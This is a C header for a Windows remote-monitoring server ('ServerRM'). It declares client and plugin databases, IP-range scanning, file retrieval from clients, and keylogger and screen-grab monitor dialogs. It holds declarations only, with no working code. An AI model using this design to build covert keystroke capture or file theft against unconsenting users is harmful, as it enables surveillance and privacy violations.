
// ** ServerRM project **
// ServerRM.h :

// ** Private Data Structures **

//Data structure to store ServerRM Configuration
typedef struct tagRMServerConf {
    BOOL			FirstRun;
    int				nClients;
    int				nPlugins;
    SYSTEMTIME		stPrevRunTime;
    SYSTEMTIME		stLogOutTime;
    int				iComPort;
    LOCALFILEPATHS	LocalFilePaths[MAX_LOCAL_FILE_PATHS];
}RMSERVERCONF;


// Data structures for storing client machines'
// information in the server database.
typedef struct tagClientInfo {
    int			nPlugins;
    PLUGININFO	PluginInfo[MAX_PLUGINS];
    SYSTEMTIME	stPrevContact;
    WCHAR		wszIP[IPADDR_LEN + 1];
    WCHAR		wszName[MAX_NICK_NAME + 1];
}CLIENTINFO;

typedef struct tagCLIENTSDB {
    int			nClients;
    CLIENTINFO	ClientInfo[MAX_CLIENTS];
}CLIENTDB;

typedef struct tagPLUGINDB {
    int			nPlugins;
    PLUGININFO	PluginInfo[MAX_PLUGINS];
}PLUGINDB;

// Data structure for storing tabbed dialog box information.
typedef struct tagDlgHdr {
    HWND hTab;			// tab control 
    HWND hCurDlg;		// current child dialog box
    HWND hAllDlgs[4];	// handle to all four child dialog boxes
}
DLGHDR;

// Data structure to store plugin monitor information
typedef struct tagPluginMonitor {
    HWND	hDlgBox;
    PTYPE	iPluginType;
}PLUGINMONITOR;

// 
typedef struct tagPMonitors {
    int				nPlugins;
    PLUGINMONITOR	PluginMonitor[MAX_PLUGINS];
}PMONITORS;

// Data structure to store handle node info in the tree view control
typedef struct tagKLHandleNode {
    HANDLE	hWnd;
    WCHAR	wszWndTitle[MAX_WND_TITLE + 1];
    WCHAR	wszKeys[MAX_KLIF_KEYS + 1];
}KLHANDLENODE;

// Data structure to store time node info in the tree view control
typedef struct tagKLTimeNode {

    WORD	wHour;
    WORD	wMinute;
    WORD	wSecond;
    WORD	wMilliseconds;

}KLTIMENODE;

// Structure to hold information about Active Clients
// when scanning a range of IPaddresses.
typedef struct tagScanResults {
    int nActive;
    CLIENTCONF ccClientConf[MAX_CLIENTS];
}SCANRESULTS;

// BMP File Format
typedef struct tagBMPFileMagic {
    unsigned char magic[2];
}BMPFILE_MAGIC;

typedef struct tagBMPFileHeader {
    UINT32 filesz;
    UINT16 creator1;
    UINT16 creator2;
    UINT32 bmp_offset;
}BMPFILE_HEADER;

typedef struct tagBMPFileDIBInfo {
    UINT32 header_sz;
    UINT32 width;
    UINT32 height;
    UINT16 nplanes;
    UINT16 bitspp;
    UINT32 compress_type;
    UINT32 bmp_bytesz;
    UINT32 hres;
    UINT32 vres;
    UINT32 ncolors;
    UINT32 nimpcolors;
}BMPFILE_DIBINFO;



// Arguments to ScanIPAddresses()
typedef struct tagScanIPAddrArgs {
    WCHAR wszFromIP[IPADDR_LEN + 1];
    WCHAR wszToIP[IPADDR_LEN + 1];
}SCAN_IPADDR_ARGS;

// Data structures to store arguments to ServerPluginManager()
typedef struct tagSPMArgs {

    RM_COMMAND			cmd;
    PTYPE				iFromPlugin;
    MNTRDATA			MNTRData;
    FILE_TRANSFER_DATA	FileTransferData;
    WCHAR				wszCliIP[IPADDR_LEN + 1];
    WCHAR				wszCliNick[MAX_NICK_NAME + 1];

}SPMARGS;

// Data structures to store arguments to ServerComModule()
typedef struct tagSCMArgs {

    RM_COMMAND			cmd;
    SPMDATA				SPMDataOut;
    SCMDATATYPE			SCMDataType;
    FILE_TRANSFER_DATA	FileTransferData;
    WCHAR				wszCliIP[IPADDR_LEN + 1];

}SCMARGS;


// ** Function Prototypes **

int WINAPI			WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow);
LRESULT CALLBACK	WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK	MsgOnlyWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
BOOL				UpdateClientConfUI(const CLIENTCONF *pClientConf);

// Dialog procks
BOOL CALLBACK	AddCliDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	RemCliDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	ViewCliDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	EditNickNameDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

BOOL CALLBACK	AddPluginDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	RemPluginDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	ViewPluginDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

BOOL CALLBACK	ConnectToDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	ScanIPAddrDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	ScanResultsDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	KeylogMonDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	SGMonDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	FBMonDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK	AboutBoxDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

// SCM
BOOL ServerComModule(RM_COMMAND cmd, const SCMARGS *pSCMArgs, const CCMDATA *pCCMDataIn);

// SPM
BOOL ServerPluginManager(RM_COMMAND cmd, const SPMARGS *pSPMArgs, const CPMDATA *pCPMDataIn);
DWORD WINAPI ScanIPAddresses(LPVOID lpArgs);
BOOL StringToIPAddress(const WCHAR *pwszIPAddr, int *awIPAddr);
BOOL IPAddressToString(const int *awIPAddr, WCHAR *pwszIPAddr, int iLen);

// Helpers
BOOL	GetClientIP(WCHAR*);
BOOL	GetClientDir(WCHAR *wszCliDir);
BOOL	GetCurrentWorkDir(WCHAR *pwszCWD);

BOOL	GetFile(const WCHAR *pwszCliSrcPath, const WCHAR *pwszLocalDestPath);

void WINAPI	OnSelChanged(HWND hDlg);

int		ComputeStructSizes();

BOOL	CenterWindow(HWND hWnd);
BOOL	ShowRightClickMenu(HWND hOwnerWnd);

BOOL	AddClientToDBFile(const CLIENTINFO *pClientInfo);
BOOL	ReadClientsDBFile(CLIENTDB *pClientsDB);
BOOL	WriteClientsDBFile(const CLIENTDB *pClientsDB);

BOOL	AddPluginToDBFile(const PLUGININFO *pNewPluginInfo);
BOOL	ReadPluginDBFile(PLUGINDB *pPluginDB);
BOOL	WritePluginDBFile(const PLUGINDB *pPluginDB);

void FreeTreeViewMemory(HWND hTree);
void TreeDFS(HWND hTree, HTREEITEM hCurNode);

BOOL WriteToAddressFile(void *pAddress, int type);